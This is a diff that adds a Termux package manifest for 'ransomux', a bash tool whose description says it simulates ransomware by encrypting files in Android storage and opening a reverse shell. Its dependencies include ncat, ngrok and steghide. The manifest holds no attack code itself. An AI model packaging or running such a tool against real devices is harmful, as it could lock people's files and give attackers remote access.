@@ -1,0 +1,13 @@
+{
+  "name": "ransomux",
+  "version": "1.0",
+  "arch": "all",
+  "homepage": "https://github.com/ivam3/termux-packages",
+  "maintainer": "Kassy Salazar <https://t.me/ladyransomware>",
+  "depends": ["git, coreutils, curl, gnupg, nmap-ncat, nodejs-lts, exiftool, php, steghide"],
+  "suggests": ["i-haklab, localtunnel, stegsnow, ngrok"],
+  "description": "A little bash tool (Only for Termux target) to simulated a ransomware effects searching to lock and encrypt files into internal|external android memory brigning a reversel shell",
+  "files" :{
+    "ransomux": "bin/ransomux"
+  }
+}
